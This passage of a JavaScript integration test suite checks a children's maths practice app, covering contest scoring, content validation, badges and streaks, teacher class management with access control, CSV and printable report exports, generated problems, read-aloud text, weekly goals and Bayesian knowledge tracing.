    assert(report.byTopic.some(t => t.topicId === "g6-ratios"), "topic breakdown missing the practised topic");

    /* Another account cannot read this learner's mistakes. */
    const bob = client();
    await post(bob, "/auth/register",
      { coppaConsent: true, email: "errbob@b.com", password: "a-long-enough-pass", name: "B" });
    assert((await bob(`/learners/${kid.id}/errors`)).status === 403,
      "another account read this learner's error report");

    return `${cases.length} classifier cases, mistakes recorded and reported by category and topic`;
  },


  /* 6.5 — intervention triggers during a session */
  "intervention-triggers": async () => {
    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "interv@b.com", password: "a-long-enough-pass", name: "I" });
    const kid = (await post(c, "/learners", { name: "Intervention Kid" })).body.learner;

    /* Three consecutive wrong answers must raise a struggling intervention. */
    const start = await post(c, "/practice/start", { learnerId: kid.id, topicId: "g6-nscoord" });
    let struggling = null, seenBefore3 = [];
    for (let i = 0; i < 4; i++) {
      const step = await post(c, "/practice/answer",
        { sessionId: start.body.sessionId, answer: "-424242", hintsUsed: 0 });
      if (step.body.done) break;
      if (i < 2) seenBefore3.push(step.body.intervention);
      if (step.body.intervention?.type === "struggling") { struggling = step.body.intervention; break; }
    }
    assert(seenBefore3.every(x => x === null || x?.type !== "struggling"),
      "struggling intervention fired before three consecutive wrong answers");
    assert(struggling, "three wrong answers in a row raised no intervention");
    assert(struggling.message && struggling.suggest, "intervention carries no message or suggestion");

    /* A correct answer clears the streak, so it does not fire again immediately. */
    const solve = async q => {
      if (q.type === "mc") {
        for (let i = 0; i < q.opts.length; i++)
          if ((await post(c, "/answer", { questionId: q.id, answer: i })).body.correct) return i;
        return 0;
      }
      if (q.type === "order") return (await post(c, "/answer", { questionId: q.id, answer: [] }))
        .body.correctAnswer.split("  →  ");
      if (q.type === "multi") { const p = await post(c, "/answer", { questionId: q.id, answer: [] });
        return p.body.correctAnswer.split(", ").map(t => q.opts.indexOf(t)); }
      return (await post(c, "/answer", { questionId: q.id, answer: "__" })).body.correctAnswer;
    };
    const s2 = await post(c, "/practice/start", { learnerId: kid.id, topicId: "g6-nscoord" });
    let q = s2.body.question, cleared = true;
    for (let i = 0; i < 3; i++) {
      const wrong = await post(c, "/practice/answer",
        { sessionId: s2.body.sessionId, answer: "-424242", hintsUsed: 0 });
      if (wrong.body.done) break;
      q = wrong.body.question;
      const right = await post(c, "/practice/answer",
        { sessionId: s2.body.sessionId, answer: await solve(q), hintsUsed: 0 });
      if (right.body.done) break;
      q = right.body.question;
      if (right.body.intervention?.type === "struggling") cleared = false;
    }
    assert(cleared, "a correct answer did not clear the wrong-answer streak");

    return "struggling fires on the third consecutive miss, not before, and a correct answer clears it";
  },


  /* 4.1.9 + 13.12 — competition prep: timed papers scored accurately */
  "competition-prep": async () => {
    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "contest@b.com", password: "a-long-enough-pass", name: "C" });
    const kid = (await post(c, "/learners", { name: "Contest Kid" })).body.learner;

    const formats = (await c("/contest/formats")).body.formats;
    for (const f of ["kangaroo", "moems", "amc8", "mathcounts"])
      assert(formats[f], `contest format ${f} missing`);

    /* Start a paper: questions must arrive without answers, with a time limit. */
    const start = await post(c, "/contest/start", { learnerId: kid.id, format: "drill" });
    assert(start.status === 200, "contest did not start");
    assert(start.body.limitSeconds > 0, "no time limit issued");
    assert(start.body.questions.length > 1, "contest paper is too short");
    const raw = JSON.stringify(start.body.questions);
    for (const k of ['"ans"', '"ansP"', '"expl"', '"a":', '"ansOrder"', '"aMulti"'])
      assert(!raw.includes(k), `contest paper leaked ${k}`);

    /* Answer everything correctly; the server must score it accurately. */
    const answers = {};
    for (const q of start.body.questions) {
      /* One helper for every type. This used to be a per-type ladder that
         fell through to /answer's display string for anything it did not
         recognise, so the day a new question type reached a contest paper
         the "perfect" answers were silently wrong and a full-marks paper
         scored 67%. Intermittently, too — papers are drawn at random, so it
         failed only when the new type happened to be picked. */
      answers[q.id] = await correctAnswerFor(q.id, c);
    }
    const done = await post(c, "/contest/submit", { contestId: start.body.contestId, answers });
    assert(done.body.pct === 100, `perfect paper scored ${done.body.pct}%`);
    assert(done.body.expired === false, "an in-time submission was marked expired");
    assert(typeof done.body.seconds === "number", "no elapsed time recorded");
    assert(done.body.byTopic.length > 0, "no topic breakdown for the paper");

    /* A spent paper cannot be resubmitted. */
    assert((await post(c, "/contest/submit", { contestId: start.body.contestId, answers })).status === 404,
      "a submitted contest was accepted twice");

    /* The clock is the server's. Test the timing rules directly rather than
       waiting out a real deadline. */
    const { isExpired, scorePaper } = await import("../app/server/src/contest.js");
    assert(isExpired(1000, 1001) === true, "a submission after the deadline was not expired");
    assert(isExpired(1000, 1000) === false, "a submission exactly on the deadline was expired");
    const late = scorePaper({ marks: [true, true, true], expired: true });
    assert(late.score === 0, `an expired paper scored ${late.score}, expected 0`);
    assert(late.correctBeforePenalty === 3, "an expired paper hid what the learner got right");
    const intime = scorePaper({ marks: [true, false, true], expired: false });
    assert(intime.score === 2 && intime.pct === 67, `in-time scoring wrong: ${JSON.stringify(intime)}`);

    const late2 = await post(c, "/contest/start", { learnerId: kid.id, format: "drill" });
    assert(late2.body.limitSeconds === formats.drill.minutes * 60,
      "issued time limit does not match the format");
    await post(c, "/contest/submit", { contestId: late2.body.contestId, answers: {} });

    /* History and analytics. */
    const hist = (await c(`/learners/${kid.id}/contests`)).body;
    assert(hist.history.length === 2, `expected 2 attempts, got ${hist.history.length}`);
    assert(hist.byFormat.some(f => f.format === "drill" && f.best === 100),
      "best score not tracked per format");

    /* Another account cannot start or read this learner's contests. */
    const bob = client();
    await post(bob, "/auth/register",
      { coppaConsent: true, email: "conbob@b.com", password: "a-long-enough-pass", name: "B" });
    assert((await post(bob, "/contest/start", { learnerId: kid.id, format: "drill" })).status === 403,
      "another account started a contest for someone else's learner");
    assert((await bob(`/learners/${kid.id}/contests`)).status === 403,
      "another account read this learner's contest history");

    return `${Object.keys(formats).length} formats, papers scored server-side, timing enforced, history tracked`;
  },


  /* 13.1 + 3.1.2-3.1.4 — authored content is valid and spread across grades */
  "content-integrity": async () => {
    const { QUESTIONS, SECS } = await import("../app/shared/questions.mjs");
    const { CURRICULUM } = await import("../app/shared/curriculum.mjs");
    const { PREREQS } = await import("../app/shared/prereqs.mjs");

    const ids = new Set();
    for (const g of Object.values(CURRICULUM))
      for (const u of g.units) for (const t of u.topics) ids.add(t.id);

    let total = 0;
    for (const [topic, bank] of Object.entries(QUESTIONS)) {
      assert(ids.has(topic), `question bank "${topic}" is not a curriculum topic`);
      assert(bank.length >= 5, `${topic} has only ${bank.length} questions`);
      const tiers = new Set(bank.map(q => (q.lvl || 1)));
      assert(tiers.size >= 2, `${topic} has questions at only one difficulty tier`);
      bank.forEach((q, i) => {
        const tag = `${topic}#${i + 1}`;
        total++;
        assert(q.q && q.q.trim(), `${tag} has no question text`);
        assert(q.expl && q.expl.trim(), `${tag} has no explanation`);
        assert(SECS[q.sec], `${tag} uses unknown section "${q.sec}"`);
        if (q.type === "mc") {
          assert(q.opts && q.opts[q.a] !== undefined, `${tag} has a bad answer index`);
          assert(new Set(q.opts).size === q.opts.length, `${tag} has duplicate options`);
          q.opts.forEach(o => assert(o === String(o).trim(), `${tag} option has stray whitespace`));
        } else if (q.type === "in") {
          assert(typeof q.ans === "number" && !isNaN(q.ans), `${tag} has a non-numeric answer`);
        } else if (q.type === "pair") {
          assert(Array.isArray(q.ansP) && q.ansP.length === 2, `${tag} has a bad ordered pair`);
        } else if (q.type === "multi") {
          assert(Array.isArray(q.aMulti) && q.aMulti.length, `${tag} has no correct selections`);
          assert(q.aMulti.every(i => q.opts[i] !== undefined), `${tag} selects a non-existent option`);
          assert(q.aMulti.length < q.opts.length, `${tag} marks every option correct`);
        } else if (q.type === "order") {
          assert([...q.items].sort().join("|") === [...q.ansOrder].sort().join("|"),
            `${tag}: ansOrder is not a permutation of items`);
          assert(q.items.length >= 3, `${tag} has too few items to order`);
        } else if (q.type === "plot") {
          /* Exactly one of the two marking modes, never both and never
             neither: a question carrying both a stored answer and a rule has
             an ambiguous mark, and one carrying neither cannot be marked. */
          const hasPoints = Array.isArray(q.ansPlot) && q.ansPlot.length > 0;
          const hasRule = !!q.plotRule;
          assert(hasPoints !== hasRule, `${tag} must have either ansPlot or plotRule, not both or neither`);
          const grid = q.plot || {};
          assert(grid.xMin < grid.xMax && grid.yMin < grid.yMax, `${tag} has no grid to plot on`);
          if (hasPoints) {
            assert(q.ansPlot.every(p => Array.isArray(p) && p.length === 2 && p.every(Number.isFinite)),
              `${tag} has a malformed point`);
            /* Every answer has to be reachable on the grid the child is
               given — an answer outside it cannot be plotted at all. */
            assert(q.ansPlot.every(([x, y]) => x >= grid.xMin && x <= grid.xMax && y >= grid.yMin && y <= grid.yMax),
              `${tag} has an answer outside its own grid`);
            assert(new Set(q.ansPlot.map(p => p.join(","))).size === q.ansPlot.length,
              `${tag} lists the same point twice`);
          } else {
            assert(Number.isFinite(q.plotRule.m) && Number.isFinite(q.plotRule.c),
              `${tag} has a malformed plot rule`);
            const need = q.plotRule.need || 2;
            /* The rule must have at least `need` solutions ON the grid, or
               the question is unanswerable however well the child reasons. */
            let reachable = 0;
            for (let x = Math.ceil(grid.xMin); x <= Math.floor(grid.xMax); x++) {
              const y = q.plotRule.m * x + q.plotRule.c;
              if (Number.isInteger(y) && y >= grid.yMin && y <= grid.yMax) reachable++;
            }
            assert(reachable >= need,
              `${tag} needs ${need} points on the line but only ${reachable} lattice points fit on its grid`);
          }
        } else assert(false, `${tag} has unknown type "${q.type}"`);
      });
    }

    /* Spread: content must not all sit in one grade. */
    const gradesWith = new Set();
    for (const [g, v] of Object.entries(CURRICULUM))
      for (const u of v.units) for (const t of u.topics) if (QUESTIONS[t.id]) gradesWith.add(g);
    assert(gradesWith.size >= 5, `only ${gradesWith.size} grades have content`);
    assert(gradesWith.has("K"), "Kindergarten has no authored content");

    /* Every authored topic should sit on the prerequisite graph. */
    for (const topic of Object.keys(QUESTIONS)) {
      const onGraph = PREREQS[topic] || Object.values(PREREQS).some(v => v.includes(topic));
      assert(onGraph, `authored topic "${topic}" is absent from the prerequisite graph`);
    }

    return `${Object.keys(QUESTIONS).length} banks, ${total} questions, ${gradesWith.size} grades, all valid`;
  },


  /* 5.1 + 5.2 + 5.4 + 5.5 — points, badges, levels and streaks */
  "gamification": async () => {
    const rewards = await import("../app/server/src/rewards.js");

    /* Advanced work must be worth more than core work (spec 5.1). */
    const core = rewards.pointsFor({ pct: 100, total: 10, track: "core" });
    const adv  = rewards.pointsFor({ pct: 100, total: 10, track: "adv" });
    assert(adv > core, `advanced work (${adv}) is not worth more than core (${core})`);
    /* Hints cost points, but can never take a score below zero. */
    const hinted = rewards.pointsFor({ pct: 100, total: 10, track: "core", hintsUsed: 5 });
    assert(hinted < core, "hints did not reduce the points awarded");
    assert(rewards.pointsFor({ pct: 10, total: 1, track: "core", hintsUsed: 99 }) >= 0,
      "heavy hint use produced negative points");

    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "game@b.com", password: "a-long-enough-pass", name: "G" });
    const kid = (await post(c, "/learners", { name: "Game Kid" })).body.learner;

    /* Nothing earned yet. */
    let r = (await c(`/learners/${kid.id}/rewards`)).body;
    assert(r.points === 0 && r.badges.length === 0, "a new learner already has rewards");
    assert(r.level === 1, `a new learner starts at level ${r.level}`);
    assert(r.catalogue && Object.keys(r.catalogue).length > 5, "badge catalogue not published");

    /* A perfect round earns points and the expected badges. */
    const run = await post(c, "/runs",
      { learnerId: kid.id, topicId: "g6-ratios", tier: "practice", score: 8, total: 8 });
    assert(run.body.reward, "a finished round returned no reward");
    assert(run.body.reward.points > 0, "a perfect round earned no points");
    const codes = run.body.reward.badges.map(b => b.code);
    assert(codes.includes("first_steps"), "no first-round badge");
    assert(codes.includes("perfect_round"), "no badge for a perfect round");

    /* Badges are awarded once, not repeatedly. */
    const again = await post(c, "/runs",
      { learnerId: kid.id, topicId: "g6-ratios", tier: "practice", score: 8, total: 8 });
    assert(!again.body.reward.badges.some(b => b.code === "perfect_round"),
      "the same badge was awarded twice");

    r = (await c(`/learners/${kid.id}/rewards`)).body;
    assert(r.points > 0, "points did not accumulate");
    assert(r.badges.length >= 2, "badges not listed on the rewards endpoint");
    assert(r.badges.every(b => b.name), "a badge has no display name");
    /* Every badge the code can award must exist in the catalogue, or it would
       render as a raw code. Scan the source for award(... "badge", "code"). */
    const { readFileSync } = await import("node:fs");
    const src = readFileSync("app/server/src/routes.js", "utf8") +
                readFileSync("app/server/src/rewards.js", "utf8");
    const awarded = [...src.matchAll(/award\([^,]+,\s*"badge",\s*"([a-z_]+)"/g)].map(m => m[1]);
    const gives = [...src.matchAll(/give\("([a-z_]+)"\)/g)].map(m => m[1]);
    for (const code of new Set([...awarded, ...gives]))
      assert(rewards.BADGES[code], `code awards badge "${code}" which is not in the catalogue`);
    assert(r.nextLevelAt > r.points || r.level > 1, "level progress is not reported");

    /* Streak counts consecutive days and breaks when a day is skipped. */
    const s0 = rewards.streak(kid.id);
    assert(s0 >= 1, `today's activity gave a streak of ${s0}`);
    const future = new Date(Date.now() + 5 * 86400000).toISOString();
    assert(rewards.streak(kid.id, future) === 0,
      "a streak survived a five-day gap");

    /* Another account cannot read this learner's rewards. */
    const bob = client();
    await post(bob, "/auth/register",
      { coppaConsent: true, email: "gamebob@b.com", password: "a-long-enough-pass", name: "B" });
    assert((await bob(`/learners/${kid.id}/rewards`)).status === 403,
      "another account read this learner's rewards");

    return `advanced worth ${adv} vs core ${core}, badges awarded once, levels and streaks tracked`;
  },


  /* 4.3.1 + 4.3.2 + 4.3.3 — teacher portal with RBAC */
  "teacher-portal": async () => {
    const teacher = client(), parent = client(), other = client();
    await post(teacher, "/auth/register",
      { coppaConsent: true, role: "teacher", email: "teach@b.com", password: "a-long-enough-pass", name: "T" });
    await post(parent, "/auth/register",
      { coppaConsent: true, email: "tparent@b.com", password: "a-long-enough-pass", name: "P" });
    await post(other, "/auth/register",
      { coppaConsent: true, role: "teacher", email: "teach2@b.com", password: "a-long-enough-pass", name: "T2" });

    /* RBAC: a parent cannot create a class. */
    const denied = await post(parent, "/classes", { name: "Sneaky" });
    assert(denied.status === 403, `a parent created a class (status ${denied.status})`);

    const cls = (await post(teacher, "/classes", { name: "Period 2" })).body.class;
    assert(cls.joinCode && cls.joinCode.length >= 4, "class has no join code");

    /* A teacher cannot pull in a learner; the parent joins with the code. */
    const kid = (await post(parent, "/learners", { name: "Class Kid" })).body.learner;
    const joined = await post(parent, "/classes/join", { joinCode: cls.joinCode, learnerId: kid.id });
    assert(joined.status === 200, "parent could not join the class with a valid code");
    assert((await post(parent, "/classes/join", { joinCode: "NOPE00", learnerId: kid.id })).status === 404,
      "an invalid join code was accepted");

    /* Assignments. */
    const a = await post(teacher, `/classes/${cls.id}/assignments`,
      { topicId: "g6-ratios", tier: "practice", dueAt: "2026-12-01" });
    assert(a.status === 200, "assignment not created");
    assert((await post(teacher, `/classes/${cls.id}/assignments`, { topicId: "not-a-topic" })).status === 400,
      "an assignment against an unknown topic was accepted");

    /* Class progress reflects real learner work. */
    let prog = (await teacher(`/classes/${cls.id}/progress`)).body;
    assert(prog.learners.length === 1, "class roster is wrong");
    assert(prog.learners[0].assignments[0].attempted === false, "an untouched assignment shows as attempted");
    assert(prog.heatmap[0].attempted === 0, "heatmap counts work that has not happened");

    await post(parent, "/runs",
      { learnerId: kid.id, topicId: "g6-ratios", tier: "practice", score: 8, total: 8 });
    prog = (await teacher(`/classes/${cls.id}/progress`)).body;
    const row = prog.learners[0].assignments[0];
    assert(row.attempted === true && row.bestPct === 100, "class progress did not pick up the learner's work");
    assert(row.mastered === true, "a perfect score is not shown as mastered");
    assert(prog.heatmap[0].mastered === 1, "heatmap did not count the mastery");
    assert(prog.heatmap[0].averagePct === 100, "heatmap average is wrong");

    /* Another teacher cannot read this class. */
    assert((await other(`/classes/${cls.id}/progress`)).status === 403,
      "another teacher read this class's progress");
    assert((await post(other, `/classes/${cls.id}/assignments`, { topicId: "g6-ratios" })).status === 403,
      "another teacher set work for this class");
    /* And a parent cannot read class progress at all. */
    assert((await parent(`/classes/${cls.id}/progress`)).status === 403,
      "a parent read teacher-only class progress");

    return "classes, parent-initiated join, assignments, class progress and heatmap, RBAC enforced";
  },


  /* 4.3.4 + 9.3 — CSV and printable reporting */
  "reporting-exports": async () => {
    const teacher = client(), parent = client();
    await post(teacher, "/auth/register",
      { coppaConsent: true, role: "teacher", email: "rep-t@b.com", password: "a-long-enough-pass", name: "T" });
    await post(parent, "/auth/register",
      { coppaConsent: true, email: "rep-p@b.com", password: "a-long-enough-pass", name: "P" });
    const kid = (await post(parent, "/learners", { name: 'Quote "Kid", Jr' })).body.learner;
    await post(parent, "/runs",
      { learnerId: kid.id, topicId: "g6-ratios", tier: "practice", score: 7, total: 8 });

    /* Learner CSV. */
    const raw = await fetch(`${BASE}/api/learners/${kid.id}/report.csv`,
      { headers: { cookie: (await post(parent, "/auth/login",
          { email: "rep-p@b.com", password: "a-long-enough-pass" })).setCookie.map(c => c.split(";")[0]).join("; ") } });
    assert(raw.ok, `CSV export failed with ${raw.status}`);
    assert(/text\/csv/.test(raw.headers.get("content-type") || ""), "CSV served with the wrong content type");
    assert(/attachment/.test(raw.headers.get("content-disposition") || ""), "CSV is not sent as a download");
    const csv = await raw.text();
    const lines = csv.trim().split("\n");
    assert(lines[0].startsWith("topic,grade,track,tier"), "CSV header is wrong");
    assert(lines.length >= 2, "CSV has no data rows");
    assert(csv.includes("88"), "CSV does not contain the recorded score");
    assert(/mastered/.test(lines[0]), "CSV omits the mastery column");

    /* A name containing a comma and quotes must not break the format. */
    const teacherCookie = (await post(teacher, "/auth/login",
      { email: "rep-t@b.com", password: "a-long-enough-pass" })).setCookie.map(c => c.split(";")[0]).join("; ");
    const cls = (await post(teacher, "/classes", { name: "Reporting" })).body.class;
    await post(parent, "/classes/join", { joinCode: cls.joinCode, learnerId: kid.id });
    const clsCsv = await (await fetch(`${BASE}/api/classes/${cls.id}/report.csv`,
      { headers: { cookie: teacherCookie } })).text();
    assert(clsCsv.includes('"Quote ""Kid"", Jr"'),
      "a learner name with a comma and quotes was not escaped for CSV");

    /* Printable report. */
    const html = await fetch(`${BASE}/api/learners/${kid.id}/report.html`,
      { headers: { cookie: (await post(parent, "/auth/login",
          { email: "rep-p@b.com", password: "a-long-enough-pass" })).setCookie.map(c => c.split(";")[0]).join("; ") } });
    assert(html.ok, "printable report failed");
    const body = await html.text();
    assert(body.startsWith("<!doctype html>"), "report is not a complete HTML document");
    assert(/<html lang="en">/.test(body), "report has no language attribute");
    assert(body.includes("Ratios &amp; Unit Rates") || body.includes("Ratios"), "report omits the topic");
    assert(!body.includes("<script"), "report contains script tags");
    assert(body.includes("Quote &quot;Kid&quot;, Jr") || body.includes("Quote \"Kid\", Jr") ||
           body.includes("Quote &lt;") || body.includes("Quote"), "report omits the learner name");

    /* Access control on both exports. */
    const bob = client();
    await post(bob, "/auth/register",
      { coppaConsent: true, email: "rep-b@b.com", password: "a-long-enough-pass", name: "B" });
    assert((await bob(`/learners/${kid.id}/report.csv`)).status === 403,
      "another account downloaded this learner's CSV");
    assert((await bob(`/classes/${cls.id}/report.csv`)).status === 403,
      "a non-teacher downloaded a class CSV");

    return "learner CSV, class CSV and printable report, with correct escaping and access control";
  },


  /* 3.2.3 — algorithmically generated problem variants */
  "generated-problems": async () => {
    const { generate, generatedTopics, TEMPLATES } = await import("../app/shared/generators.mjs");

    /* Reproducible: the same seed must rebuild the identical problem, or a
       generated question could not be marked or reviewed later. */
    for (const t of generatedTopics()) {
      const a = generate(t, 4242), b = generate(t, 4242);
      assert(a && b, `${t} generated nothing`);
      assert(a.q === b.q && a.ans === b.ans, `${t} is not reproducible from its seed`);
      assert(a.expl && a.hint, `${t} generated no explanation or hint`);
    }

    /* Varied: different seeds must give genuinely different problems. */
    for (const t of generatedTopics()) {
      const seen = new Set();
      for (let i = 0; i < 40; i++) seen.add(generate(t, i * 977).q);
      assert(seen.size > 10, `${t} produced only ${seen.size} distinct problems in 40 seeds`);
    }

    /* Answers must be correct, checked against each template's own maths. */
    for (let i = 0; i < 50; i++) {
      const m = generate("g3-mult", i);
      const [x, y] = m.q.match(/(\d+) × (\d+)/).slice(1).map(Number);
      assert(m.ans === x * y, `g3-mult generated ${m.q} with answer ${m.ans}`);
      const p = generate("g6-percent", i);
      const [pct, base] = p.q.match(/What is (\d+)% of (\d+)/).slice(1).map(Number);
      assert(p.ans === (base * pct) / 100, `g6-percent wrong: ${p.q} => ${p.ans}`);
      assert(Number.isInteger(p.ans), `g6-percent produced a non-whole answer: ${p.q}`);
      const d = generate("g6-nscoord", i);
      assert(d.ans > 0, `g6-nscoord generated a zero distance: ${d.q}`);
      const r2 = generate("g6-ratios", i);
      assert(Number.isInteger(r2.ans) && r2.ans > 0, `g6-ratios produced ${r2.ans}`);
    }

    /* Served without answers, and gradeable through the normal endpoint. */
    const c = client();
    const list = (await c("/generated/topics")).body.topics;
    assert(list.length >= 3, "too few generated topics published");
    const res = await c("/topics/g3-mult/generated?count=5&seed=777");
    assert(res.status === 200 && res.body.questions.length === 5, "generated endpoint failed");
    const raw = JSON.stringify(res.body.questions);
    for (const k of ['"ans"', '"expl"']) assert(!raw.includes(k), `generated question leaked ${k}`);
    assert(res.body.questions.every(q => q.id.startsWith("gen:")), "generated ids are not marked");
    assert(new Set(res.body.questions.map(q => q.q)).size === 5, "the same problem was served five times");

    /* The server can mark a generated question from its id alone. */
    const q0 = res.body.questions[0];
    const [x, y] = q0.q.match(/(\d+) × (\d+)/).slice(1).map(Number);
    const right = await post(c, "/answer", { questionId: q0.id, answer: String(x * y) });
    assert(right.body.correct === true, "a correct answer to a generated question was marked wrong");
    assert(right.body.explanation, "no explanation returned for a generated question");
    const wrong = await post(c, "/answer", { questionId: q0.id, answer: String(x * y + 1) });
    assert(wrong.body.correct === false, "a wrong answer to a generated question was accepted");

    /* Hints work on generated questions too. */
    const h = await post(c, "/hint", { questionId: q0.id, level: 1 });
    assert(h.status === 200 && h.body.hint, "hints unavailable for generated questions");

    /* Repeating the same request returns the same problems. */
    const again = await c("/topics/g3-mult/generated?count=5&seed=777");
    assert(JSON.stringify(again.body.questions.map(q => q.q)) ===
           JSON.stringify(res.body.questions.map(q => q.q)),
      "the same seed served different problems");

    /* Unknown template and malformed ids are refused. */
    assert((await c("/topics/g8-rsa/generated")).status === 404, "a topic with no template returned questions");
    assert((await post(c, "/answer", { questionId: "gen:g3-mult:notanumber", answer: "1" })).status === 400,
      "a malformed generated id was accepted");

    return `${generatedTopics().length} templates, reproducible from seed, served without answers, gradeable and hintable`;
  },


  /* 3.2.9 — read-aloud speaks maths as words, not symbols */
  "read-aloud": async () => {
    /* The text transform is pure, so test it directly rather than driving
       a speech engine. */
    const { execSync } = await import("node:child_process");
    const { writeFileSync, rmSync } = await import("node:fs");
    const entry = "app/web/a11y/speak-probe.mjs";
    writeFileSync(entry, `import { speakableText } from "../src/components/ReadAloud";
      const cases = ${JSON.stringify([
        ["4 × 6 = ?", "times"],
        ["12 ÷ 3 = ?", "divided by"],
        ["8 + 5 = ?", "plus"],
        ["9 - 4 = ?", "minus"],
        ["What is 25% of 80?", "percent"],
        ["The ratio 4 : 6", "4 to 6"],
        ["What is 1/2 of 10?", "half"],
        ["Order 3/4 and 1/4", "quarter"],
        ["Plot (3, -2) on the grid", "the point 3 comma -2"],
        ["What is |-7|?", "the absolute value of -7"]
      ])};
      const out = cases.map(([input, want]) => {
        const got = speakableText(input);
        return { input, want, got, ok: got.toLowerCase().includes(want.toLowerCase()) };
      });
      console.log(JSON.stringify(out));`);
    try {
      execSync(`./node_modules/.bin/esbuild ${entry.replace("app/web/", "")} --bundle --platform=node --format=esm --outfile=a11y/speak-probe.built.mjs`,
        { cwd: "app/web", stdio: "pipe" });
      const raw = execSync("node a11y/speak-probe.built.mjs", { cwd: "app/web" }).toString();
      const results = JSON.parse(raw);
      for (const r of results)
        assert(r.ok, `read-aloud: "${r.input}" became "${r.got}", expected it to contain "${r.want}"`);
      /* And it must not simply echo the symbol form. */
      const times = results.find(r => r.want === "times");
      assert(!times.got.includes("×"), "the multiplication sign was left in the spoken text");
      return `${results.length} maths phrases spoken as words`;
    } finally {
      rmSync(entry, { force: true });
      rmSync("app/web/a11y/speak-probe.built.mjs", { force: true });
    }
  },


  /* 4.2.6 — weekly goals with progress against them */
  "goals": async () => {
    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "goal@b.com", password: "a-long-enough-pass", name: "G" });
    const kid = (await post(c, "/learners", { name: "Goal Kid" })).body.learner;

    /* No goal set yet. */
    let g = (await c(`/learners/${kid.id}/goal`)).body;
    assert(g.goal === null, "a learner started with a goal already set");

    /* An empty goal is refused rather than silently stored. */
    assert((await c(`/learners/${kid.id}/goal`,
      { method: "PUT", body: JSON.stringify({ roundsPerWeek: 0, minutesPerWeek: 0 }) })).status === 400,
      "an empty goal was accepted");

    await c(`/learners/${kid.id}/goal`,
      { method: "PUT", body: JSON.stringify({ roundsPerWeek: 3 }) });
    g = (await c(`/learners/${kid.id}/goal`)).body;
    assert(g.goal.roundsPerWeek === 3, "goal not stored");
    assert(g.roundsThisWeek === 0, "a fresh learner already has rounds this week");
    assert(g.met === false, "an untouched goal is reported as met");

    /* Doing the work moves the goal towards met. */
    for (let i = 0; i < 3; i++)
      await post(c, "/runs",
        { learnerId: kid.id, topicId: "g6-ratios", tier: "practice", score: 5, total: 8 });
    g = (await c(`/learners/${kid.id}/goal`)).body;
    assert(g.roundsThisWeek === 3, `expected 3 rounds counted, got ${g.roundsThisWeek}`);
    assert(g.met === true, "a completed goal is not reported as met");
    assert(g.percentOfGoal === 100, `percent of goal is ${g.percentOfGoal}`);

    /* Updating replaces rather than duplicating. */
    await c(`/learners/${kid.id}/goal`,
      { method: "PUT", body: JSON.stringify({ roundsPerWeek: 10 }) });
    g = (await c(`/learners/${kid.id}/goal`)).body;
    assert(g.goal.roundsPerWeek === 10, "goal was not updated");
    assert(g.met === false, "a raised goal is still reported as met");

    /* Another account cannot read or set this learner's goal. */
    const bob = client();
    await post(bob, "/auth/register",
      { coppaConsent: true, email: "goalbob@b.com", password: "a-long-enough-pass", name: "B" });
    assert((await bob(`/learners/${kid.id}/goal`)).status === 403, "another account read the goal");
    assert((await bob(`/learners/${kid.id}/goal`,
      { method: "PUT", body: JSON.stringify({ roundsPerWeek: 1 }) })).status === 403,
      "another account set the goal");

    return "goals set, updated, measured against real rounds, and access-controlled";
  },


  /* 6.3 — Bayesian Knowledge Tracing */
  "knowledge-tracing": async () => {
    const bkt = await import("../app/server/src/bkt.js");

    /* Direction: correct raises the estimate, wrong lowers it. */
    const start = bkt.DEFAULTS.pInit;
    assert(bkt.update(start, true) > start, "a correct answer did not raise P(known)");
    assert(bkt.update(0.9, false) < 0.9, "a wrong answer did not lower P(known)");

    /* Bounded: the estimate stays a probability whatever the history. */
    let p = start;
    for (let i = 0; i < 60; i++) p = bkt.update(p, true);
    assert(p <= 1 && p > 0.99, `after 60 correct answers P(known) = ${p}`);
    let q = 0.99;
    for (let i = 0; i < 60; i++) q = bkt.update(q, false);
    assert(q >= 0 && q < 0.3, `after 60 wrong answers P(known) = ${q}`);

    /* Slip: one wrong answer must NOT erase a well-established skill. */
    let strong = start;
    for (let i = 0; i < 8; i++) strong = bkt.update(strong, true);
    const afterSlip = bkt.update(strong, false);
    assert(afterSlip > 0.3, `a single slip collapsed a strong skill to ${afterSlip.toFixed(3)}`);

    /* Guess: one lucky answer must NOT declare mastery. This is the behaviour
       a streak counter cannot express, and the reason the spec asks for BKT. */
    const oneLucky = bkt.update(start, true, bkt.paramsFor({ optionCount: 4 }));
    assert(!bkt.isKnown({ pKnown: oneLucky, observations: 1 }),
      "a single lucky multiple-choice answer counted as mastery");

    /* Guess rate must reflect the number of options. */
    assert(bkt.paramsFor({ optionCount: 2 }).pGuess > bkt.paramsFor({ optionCount: 5 }).pGuess,
      "a two-option question is not treated as easier to guess than a five-option one");

    /* Evidence requirement: high probability alone is not mastery. */
    assert(!bkt.isKnown({ pKnown: 0.99, observations: 1 }),
      "mastery declared on a single observation");
    assert(bkt.isKnown({ pKnown: 0.99, observations: 5 }), "mastery never reached despite strong evidence");

    /* End to end: practice answers move the learner's stored estimate. */
    const c = client();
    await post(c, "/auth/register",
      { coppaConsent: true, email: "bkt@b.com", password: "a-long-enough-pass", name: "K" });
    const kid = (await post(c, "/learners", { name: "BKT Kid" })).body.learner;

    let before = (await c(`/learners/${kid.id}/skills`)).body.skills;
    assert(before.length === 0, "a new learner already has skill estimates");

    const st = await post(c, "/practice/start", { learnerId: kid.id, topicId: "g6-ratios" });
    let cur = st.body.question, guard = 0;
    while (guard++ < 15) {
      const step = await post(c, "/practice/answer",
        { sessionId: st.body.sessionId, answer: "-999999", hintsUsed: 0 });
      if (step.body.done) break;
      cur = step.body.question;
    }
    const after = (await c(`/learners/${kid.id}/skills`)).body;
    const skill = after.skills.find(s => s.skillId === "g6-ratios");
    assert(skill, "no skill estimate recorded after a practice session");
    assert(skill.observations >= 5, `only ${skill.observations} observations recorded`);
    assert(skill.pKnown < bkt.DEFAULTS.pInit,
      `an all-wrong session left P(known) at ${skill.pKnown}, no lower than the prior`);
    assert(skill.known === false, "an all-wrong session was counted as known");
    assert(skill.name, "skill estimates are not named");

    /* Another account cannot read the model for this learner. */
    const bob = client();
    await post(bob, "/auth/register",
      { coppaConsent: true, email: "bktbob@b.com", password: "a-long-enough-pass", name: "B" });
    assert((await bob(`/learners/${kid.id}/skills`)).status === 403,
      "another account read this learner's skill model");

    return "P(known) updated per answer, slip and guess handled, mastery needs evidence not just confidence";
